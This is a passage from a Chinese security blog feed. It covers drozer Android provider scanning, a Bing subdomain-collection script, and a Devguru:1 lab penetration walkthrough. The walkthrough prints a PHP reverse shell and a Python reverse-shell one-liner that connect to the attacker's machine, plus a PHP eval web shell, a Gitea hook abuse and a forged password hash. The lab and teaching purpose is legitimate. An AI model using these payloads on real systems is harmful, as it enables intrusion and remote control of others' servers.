class="hljs-regexp">/pentest/</span>apptest/<br>Written <span class="hljs-number">56</span> bytes<br></code></pre></td></tr></table></figure><p><strong>目录遍历漏洞</strong>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"> dz&gt; run scanner.provider.traversal -a com.mwr.example.sieve<br>Scanning com.mwr.example.sieve...<br>Not Vulnerable:<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider/<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider/Keys<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Passwords/</span><br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Keys/</span><br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider/Passwords<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<br><br>Vulnerable Providers:<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.FileBackupProvider/<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.FileBackupProvider<br></code></pre></td></tr></table></figure><p>参考文章：</p><p><a href="https://bbs.pediy.com/thread-269196.htm">Android漏洞挖掘三板斧——drozer+Inspeckage(xposed)+MobSF</a></p><p><a href="https://www.jianshu.com/p/dfa92bab3a55">Android安全测试框架Drozer（使用篇）</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python练习第一弹：子域名挖掘</title>
    <link href="/2021/06/12/Python%E7%BB%83%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%BC%B9%EF%BC%9A%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98/"/>
    <url>/2021/06/12/Python%E7%BB%83%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%BC%B9%EF%BC%9A%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98/</url>
    
    <content type="html"><![CDATA[<h2 id="Python练习：子域名"><a href="#Python练习：子域名" class="headerlink" title="Python练习：子域名"></a>Python练习：子域名</h2><p>​    这个tag是为了记录一下学习python的过程，收录的都是练手的一些代码，这篇是一个很简单的借助搜索引擎收集子域名的小脚本，构造好http包，然后借助搜索语法，利用搜索引擎进行查询，之后收集查询到的域名，再把收集到的域名去重，打印出来。</p><p>​    下面这个是这个小脚本的核心部分，bing_search函数，这里是使用了bing搜索引擎做了一个子域名的收集，师傅们可以做些修改，能上谷歌的可以改成google hacker语法，功能会更好些</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs css">def bing_search(site,pages):<br>    Subdomain = []<br>    #填充http头<br>    headers = &#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (xll;Linux x86_64;rv:60.0) Gecko/20100101 Firefox/60.0&#x27;</span>,<br>               <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;*/*&#x27;</span>,<br>               <span class="hljs-string">&#x27;Accept-Language&#x27;</span>:<span class="hljs-string">&#x27;en-US,en;q=0.5&#x27;</span>,<br>               <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>:<span class="hljs-string">&#x27;gzip,deflate&#x27;</span>,<br>               <span class="hljs-string">&#x27;referer&#x27;</span>:<span class="hljs-string">&quot;http://cn.bing.com/search?q=email+site%3abaidu.com&amp;qs=n&amp;sp=-1&amp;pq=emailsite%3abaidu.com&amp;first=2&amp;FORM=PERE1&quot;</span>&#125;<br>    #循环发送请求查询，并记录域名等信息<br>    for <span class="hljs-selector-tag">i</span> in range(<span class="hljs-number">1</span>,int(pages)):<br>        url = <span class="hljs-string">&quot;https://cn.bing.com/search?q=site%3a&quot;</span>+site+<span class="hljs-string">&quot;&amp;go=Search&amp;qs=ds&amp;first=&quot;</span>+ <span class="hljs-built_in">str</span>((<span class="hljs-built_in">int</span>(i)-<span class="hljs-number">1</span>)*<span class="hljs-number">10</span>) +<span class="hljs-string">&quot;&amp;FORM+PERE&quot;</span><br>        conn = requests.<span class="hljs-built_in">session</span>()<br>        conn.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;http://cn.bing.com&#x27;</span>,headers=headers)<br>        html = conn.<span class="hljs-built_in">get</span>(url,stream=True,headers=headers,timeout=<span class="hljs-number">8</span>)<br>        soup = <span class="hljs-built_in">BeautifulSoup</span>(html.content,<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>        job_bt = soup.<span class="hljs-built_in">findAll</span>(<span class="hljs-string">&#x27;h2&#x27;</span>)<br>        #嵌套循环，这里用到了urlparse,urlparse会将url解析为六个部分，这里的scheme是协议，netloc是域名服务器<br>        for i in job_bt:<br>            link = i.a.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;href&#x27;</span>)<br>            domain = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">urlparse</span>(link).scheme+<span class="hljs-string">&quot;://&quot;</span>+<span class="hljs-built_in">urlparse</span>(link).netloc)<br>            #判重<br>            if domain in Subdomain:<br>                pass<br>            else:<br>                Subdomain.<span class="hljs-built_in">append</span>(domain)<br>                <span class="hljs-built_in">print</span>(domain)<br></code></pre></td></tr></table></figure><p>下面是整个小工具的源码部分，一开始考虑到往里面加上域名-ip的反查和whois查询，后来想了一下，不是特别有必要，于是就去掉了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span><br><span class="hljs-comment"># _*_ coding:utf-8 _*_</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">from</span> whois <span class="hljs-keyword">import</span> whois<br><br><span class="hljs-comment">#bing_search函数，使用bing搜索引擎语法进行子域名收集，参数site为域名，page为页数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bing_search</span>(<span class="hljs-params">site,pages</span>):</span><br>    Subdomain = []<br>    <span class="hljs-comment">#填充http头</span><br>    headers = &#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (xll;Linux x86_64;rv:60.0) Gecko/20100101 Firefox/60.0&#x27;</span>,<br>               <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;*/*&#x27;</span>,<br>               <span class="hljs-string">&#x27;Accept-Language&#x27;</span>:<span class="hljs-string">&#x27;en-US,en;q=0.5&#x27;</span>,<br>               <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>:<span class="hljs-string">&#x27;gzip,deflate&#x27;</span>,<br>               <span class="hljs-string">&#x27;referer&#x27;</span>:<span class="hljs-string">&quot;http://cn.bing.com/search?q=email+site%3abaidu.com&amp;qs=n&amp;sp=-1&amp;pq=emailsite%3abaidu.com&amp;first=2&amp;FORM=PERE1&quot;</span>&#125;<br>    <span class="hljs-comment">#循环发送请求查询，并记录域名</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">int</span>(pages)):<br>        url = <span class="hljs-string">&quot;https://cn.bing.com/search?q=site%3a&quot;</span>+site+<span class="hljs-string">&quot;&amp;go=Search&amp;qs=ds&amp;first=&quot;</span>+ <span class="hljs-built_in">str</span>((<span class="hljs-built_in">int</span>(i)-<span class="hljs-number">1</span>)*<span class="hljs-number">10</span>) +<span class="hljs-string">&quot;&amp;FORM+PERE&quot;</span><br>        conn = requests.session()<br>        conn.get(<span class="hljs-string">&#x27;http://cn.bing.com&#x27;</span>,headers=headers)<br>        html = conn.get(url,stream=<span class="hljs-literal">True</span>,headers=headers,timeout=<span class="hljs-number">8</span>)<br>        soup = BeautifulSoup(html.content,<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>        job_bt = soup.findAll(<span class="hljs-string">&#x27;h2&#x27;</span>)<br>        <span class="hljs-comment">#嵌套循环，这里用到了urlparse,urlparse会将url解析为六个部分，这里的scheme是协议，netloc是域名服务器，前面加了//是为了它的正常解析</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> job_bt:<br>            link = i.a.get(<span class="hljs-string">&#x27;href&#x27;</span>)<br>            domain = <span class="hljs-built_in">str</span>(urlparse(link).scheme+<span class="hljs-string">&quot;://&quot;</span>+urlparse(link).netloc)<br>            <span class="hljs-comment">#判断是否重复</span><br>            <span class="hljs-keyword">if</span> domain <span class="hljs-keyword">in</span> Subdomain:<br>                <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">else</span>:<br>                Subdomain.append(domain)<br>                <span class="hljs-built_in">print</span>(domain)<br><span class="hljs-comment">#这个domain_ip是为了做一下域名-ip转换，后来觉得没必要，就注释掉了</span><br><span class="hljs-comment">#def domain_ip(site):</span><br><span class="hljs-comment">#    ip = socket.gethostbyname(&#x27;www.baidu.com&#x27;)</span><br><span class="hljs-comment">#    print(&quot;ip:&quot;,ip)</span><br><br><span class="hljs-comment">#同样的，whois是为了做一下whois查询，也注释掉了</span><br><span class="hljs-comment">#def whois(site):</span><br><span class="hljs-comment">#    data = whois(&#x27;www.baidu.com&#x27;)</span><br><span class="hljs-comment">#    print(&quot;data:&quot;,data)</span><br>    <br><span class="hljs-comment">#main函数             </span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment">#判断输入是否合法，两个参数，一个是域名，一个是搜索页数，页数越多结果越多，相应的时间也长</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)==<span class="hljs-number">3</span>:<br>        site = sys.argv[<span class="hljs-number">1</span>]<br>        page = sys.argv[<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;usage: %s baidu.com 10&quot;</span> % sys.argv[<span class="hljs-number">0</span>])<br>        sys.exit(-<span class="hljs-number">1</span>)<br>    <span class="hljs-comment">#domain_ip(site)</span><br>    <span class="hljs-comment">#print(&quot;************************************************************&quot;)</span><br>    <span class="hljs-comment">#whois(site)</span><br>   <span class="hljs-comment"># print(&quot;************************************************************&quot;)</span><br>    Subdomain = bing_search(site,page)<br><br></code></pre></td></tr></table></figure><h5 id="使用测试："><a href="#使用测试：" class="headerlink" title="使用测试："></a>使用测试：</h5><p>收集的并不是很全，毕竟方法比较原始，代码也比较简单，以后再接再厉</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210612212014004.png" alt="image-20210612212014004"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210612212028693.png" alt="image-20210612212028693"></p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Devguru1靶机练习</title>
    <link href="/2021/05/15/Devguru1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2021/05/15/Devguru1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="Devguru-1靶机练习"><a href="#Devguru-1靶机练习" class="headerlink" title="Devguru:1靶机练习"></a>Devguru:1靶机练习</h2><p>文章首发于云众可信：<a href="https://sec-in.com/article/942">Devguru:1靶机渗透-SecIN (sec-in.com)</a></p><h3 id="网络结构："><a href="#网络结构：" class="headerlink" title="网络结构："></a>网络结构：</h3><p>环境搭建平台为VMware15，网络为nat模式，网段192.168.1.0/24</p><p>网络由攻击机kali、靶机组成</p><p>靶机ip：192.168.1.143</p><p>kali linux ip：192.168.1.137</p><h3 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h3><h5 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a>主机发现：</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>如下图，图中192.168.1.1为VMnet8网卡地址，1.3为网关地址，1.137为kali地址，因此判断目标靶机地址为192.168.1.143</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210226211653677.png" alt="image-20210226211653677"></p><h5 id="端口服务扫描："><a href="#端口服务扫描：" class="headerlink" title="端口服务扫描："></a>端口服务扫描：</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -A <span class="hljs-number">192.168.1.143</span> -sV -T<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>如下图，除开启22端口ssh服务以及80端口外，还另外开放了8585端口</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210226211934524.png" alt="image-20210226211934524"></p><h5 id="目录爆破："><a href="#目录爆破：" class="headerlink" title="目录爆破："></a>目录爆破：</h5><p>dirb：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb <span class="hljs-string">&quot;http://192.168.1.143&quot;</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/dirb/</span>wordlists/big.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210226221954531.png" alt="image-20210226221954531"></p><p>dirsearch：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python dirsearch.py -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.143</span> -e *<br></code></pre></td></tr></table></figure><p>如下图，除与dirb扫描结果类似的目录外，还看到了一个./git目录</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210226223113342.png" alt="image-20210226223113342"></p><p>访问一下爆破出的目录：</p><p>共发现两个比较有价值的页面，一个80端口后台管理登录页面，80端口是个October框架的网站</p><p><a href="http://192.168.1.143/backend/backend/auth/signin">http://192.168.1.143/backend/backend/auth/signin</a></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210227195533892.png" alt="image-20210227195533892"></p><p>8585端口也有个登录页面，是个gitea搭建的项目托管网站</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210227195726337.png" alt="image-20210227195726337"></p><h3 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h3><p>之前在使用dirsearch爆破目录时，看到一个.git/目录，这里我们可以用另外一个工具githack将其下载下来，GitHacker是一个多线程工具，可以检测站点是否存在git源码泄漏，并能够将网站源代码下载到本地。</p><p>工具获取连接：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/GitHack.py http:/</span><span class="hljs-regexp">/192.168.1.143/</span>.git/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210303173819905.png" alt="image-20210303173819905"></p><p>成功拿到git源码</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210303174308966.png" alt="image-20210303174308966"></p><p>经百度，得知October的数据库信息存储在database.php文件中，在config目录下找到此文件，查看文件内容，成功找到数据库用户名密码 october，SQ66EBYx4GT3byXH</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210303174933576.png" alt="image-20210303174933576"></p><p>登录之后来到网站的后台管理页面，，可以看到CMS选项下有一个添加页面的功能</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210309210226526.png" alt="image-20210309210226526"></p><p>我们可以利用这个，新建个新页面来制作反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onStart</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$s</span>=fsockopen(<span class="hljs-string">&quot;192.168.1.137&quot;</span>,<span class="hljs-number">4444</span>);<br>    <span class="hljs-variable">$proc</span>=proc_open(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>=&gt;<span class="hljs-variable">$s</span>, <span class="hljs-number">1</span>=&gt;<span class="hljs-variable">$s</span>, <span class="hljs-number">2</span>=&gt;<span class="hljs-variable">$s</span>),<span class="hljs-variable">$pipes</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210309210430869.png" alt="image-20210309210430869"></p><p>点击save保存，kali端监听端口</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210309210627673.png" alt="image-20210309210627673"></p><p>然后点击preview，反弹成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210309211004680.png" alt="image-20210309211004680"></p><p>同样方式创建一个一句话木马，用蚁剑连接，上传一个本地漏洞搜集脚本linEnum，这是一个基本shell脚本，从内核信息到定位可能的升级点（包括可能有用的SUID / GUID文件以及Sudo / rhost错误配置等等）进行扫描，以查找可能存在的提权漏洞，下载链接<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onStart</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">123</span>]);<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210309211307394.png" alt="image-20210309211307394"></p><p>执行这个脚本，然而并没有看到什么有用的提权信息，说明www用户的权限被设置的很低，我们需要从其他用户入手，从脚本提供的信息来看，passwd文件是可读的</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210309212245527.png" alt="image-20210309212245527"></p><p>打开看一下，可以看到里面有一个用户frank，之前我们查看数据库的时候就遇见他了，老熟人了</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210309212420619.png" alt="image-20210309212420619"></p><p>但October的shell我们已经获取过了，只能是www用户，所以我们需要从其他的方面入手，比如说之前扫目录的时候看见的8585端口的gitea网站</p><p>暂时没在主机上找到有关gitea数据库相关的用户名密码，但之前用LinEnum搜集信息中，有一个app.ini.bak备份文件，在里面找到了gitea数据库的用户名密码</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210309213501042.png" alt="image-20210309213501042"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210309213621385.png" alt="image-20210309213621385"></p><p>再回之前的那个数据库登录页面，这次我们登gitea数据库</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210309214001353.png" alt="image-20210309214001353"></p><p>登录进去之后可以看到一个user表，里面有一个用户frank，但密码被加密了</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210310194558467.png" alt="image-20210310194558467"></p><p>这里我们不知道加密方式，没法直接解，但gitea的框架是开源的，我们可以在github上直接找到项目源码</p><p><a href="https://github.com/go-gitea/gitea/blob/master/models/user.go">https://github.com/go-gitea/gitea/blob/master/models/user.go</a></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210310194921296.png" alt="image-20210310194921296"></p><p>在这里我们可以找到密码的加密代码，使用一个我们自己设定的新口令，加密后替换到数据库中</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210310195433379.png" alt="image-20210310195433379"></p><p>最终得到代码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package main<br><br>import (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;crypto/sha256&quot;</span><br><span class="hljs-string">&quot;golang.org/x/crypto/pbkdf2&quot;</span><br>)<br><br>func <span class="hljs-selector-tag">main</span>() &#123;<br><span class="hljs-selector-tag">var</span> tempPasswd <span class="hljs-selector-attr">[]</span>byte<br>tempPasswd = pbkdf2<span class="hljs-selector-class">.Key</span>(<span class="hljs-selector-attr">[]</span>byte(<span class="hljs-string">&quot;12345&quot;</span>), <span class="hljs-selector-attr">[]</span>byte(<span class="hljs-string">&quot;Bop8nwtUiM&quot;</span>), <span class="hljs-number">10000</span>, <span class="hljs-number">50</span>, sha256.New)<br>fmt<span class="hljs-selector-class">.Println</span>(fmt<span class="hljs-selector-class">.Sprintf</span>(<span class="hljs-string">&quot;%x&quot;</span>, tempPasswd))<br>&#125;<br></code></pre></td></tr></table></figure><p>代码为go语言编写，没有环境的话，可以在这个链接运行</p><p><a href="https://play.golang.org/">https://play.golang.org/</a></p><p>运行后得到加密结果</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210310200300579.png" alt="image-20210310200300579"></p><p>将其替换至数据库中</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210310200639175.png" alt="image-20210310200639175"></p><p>保存修改，在登录界面登录测试，登录成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210310200822595.png" alt="image-20210310200822595"></p><p>我们找到frank用户的git代码仓库</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210310201324488.png" alt="image-20210310201324488"></p><p>gitea支持githook，我们可以自定义这些hook，在我们进行例如更新git源码这种重要动作时，这些我们事先定义好的名为hook的脚本便会起作用，执行一些例如发送邮件、核查代码等工作，同样的，我们也可以利用这些hook，来帮助我们进行渗透，例如反弹一个shell</p><p>在settings选项下我们就可以找到编辑githook的位置</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210310202627053.png" alt="image-20210310202627053"></p><p>这里我们选择pre-receive，pre-receive会在push前检查我们编写的规则，即只要我们提交保存代码，这个钩子就会执行，在里面写上我们自己的python反弹shell代码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;192.168.1.137&quot;</span>,<span class="hljs-number">4443</span>));os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">0</span>); os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">1</span>);os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">2</span>);import pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><p>保存修改，然后监听设置的4443端口</p><p><img src="D:\blog\hexo\source_posts\Devguru1靶机练习.assets\image-20210310202931444.png" alt="image-20210310202931444"></p><p>随便找一个文件修改一下，README.md也可以</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210310202952759.png" alt="image-20210310202952759"></p><p>提交修改，反弹成功，是我们预想的frank用户</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210310203042712.png" alt="image-20210310203042712"></p><h3 id="权限提升："><a href="#权限提升：" class="headerlink" title="权限提升："></a>权限提升：</h3><p>拿到shell之后，再运行linEnum收集一次信息，因为我们使用的这个shell显示信息不是很方便，这里找一个有写权限的目录，将收集结果写入一个文件中</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210310210541231.png" alt="image-20210310210541231"></p><p>进到/tmp目录下，将这个文件用scp挪到外面来</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">scp <span class="hljs-number">1</span>.txt root<span class="hljs-variable">@192</span>.<span class="hljs-number">168.1</span>.<span class="hljs-number">131</span><span class="hljs-symbol">:/root/</span><span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210310210648930.png" alt="image-20210310210648930"></p><p>再查看枚举结果，可以看到存在sqlite3漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210310210758266.png" alt="image-20210310210758266"></p><p>搜索这个漏洞，用到一个网站<a href="https://gtfobins.github.io/%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E8%BF%98%E6%9C%89%E4%B8%80%E4%B8%AA%E5%9C%A8%E7%BA%BF%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7%EF%BC%8C%E6%9C%89%E5%85%B4%E8%B6%A3%E7%9A%84%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BD%E4%B8%80%E4%B8%8Bhttps://github.com/GTFOBins/GTFOBins.github.io">https://gtfobins.github.io/，这个网站还有一个在线的漏洞搜索工具，有兴趣的可以下载一下https://github.com/GTFOBins/GTFOBins.github.io</a></p><p>言归正题，搜索到漏洞之后，这里给出了sqlite3的漏洞利用代码</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210421105256946.png" alt="image-20210421105256946"></p><p><img src="D:\blog\hexo\source_posts\Devguru1靶机练习.assets\image-20210310211227479.png" alt="image-20210310211227479"></p><p>我们正常输入利用代码，试图获取shell之后，如果想要使用sudo以root身份执行，依旧会提示输入密码，不可行，但我们之前收集系统信息的时候还可以看到sudo版本</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//ACID/image-20210310211703347.png" 